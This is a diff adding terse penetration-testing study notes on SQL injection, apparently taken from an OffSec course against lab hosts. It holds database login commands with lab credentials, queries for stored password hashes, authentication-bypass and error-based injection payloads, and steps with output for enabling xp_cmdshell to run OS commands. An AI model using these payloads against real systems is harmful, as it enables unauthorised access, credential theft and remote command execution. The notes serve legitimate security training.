@@ -1,0 +1,73 @@
+steps.SQLI
+
+SQLI 
+
+MySQl (p289)
+
+    generic  connect
+    mysql -u root -p'root' -h 192.168.50.16 -P 3306 
+    
+    select version();
+    select system_user();
+    show databases; 
+
+    generic select
+    SELECT user, authentication_string FROM mysql.user WHERE user = 'offsec'; 
+
+
+MSSQL (p290)
+
+    impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
+
+    -windows-auth keyword forces NTLM
+
+    SELECT name FROM sys.databases;
+    SELECT * FROM offsec.information_schema.tables; 
+    select * from offsec.dbo.users;
+
+
+Identifying SQLi via Error-based Payloads (p293)
+
+    test string for input fields --
+
+    error?
+    auth bypass
+
+    admin' OR 1=1 -- // 
+
+    maybe run a command 
+
+    ' or 1=1 in (select @@version) -- //
+
+
+    NOTE if it smells like SQLI try to execute OS command 
+
+
+    Much deeper  reference PDF
+
+
+Manual Code Execution
+
+From form prompt 
+
+EXECUTE xp_cmdshell 'whoami';
+
+
+  How to enable command execution from prompt. (P307)
+  
+    kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth 
+    Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation 
+    ... 
+    SQL> EXECUTE sp_configure 'show advanced options', 1; 
+    [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'show advanced options' 
+    changed from 0 to 1. Run the RECONFIGURE statement to install.
+    SQL> RECONFIGURE; 
+    SQL> EXECUTE sp_configure 'xp_cmdshell', 1; 
+    [*] INFO(SQL01\SQLEXPRESS): Line 185: Configuration option 'xp_cmdshell' changed from 
+    0 to 1. Run the RECONFIGURE statement to install. 
+    SQL> RECONFIGURE;
+
+
+
+Use UNION SELECT to put paylaod on server (p308)
+
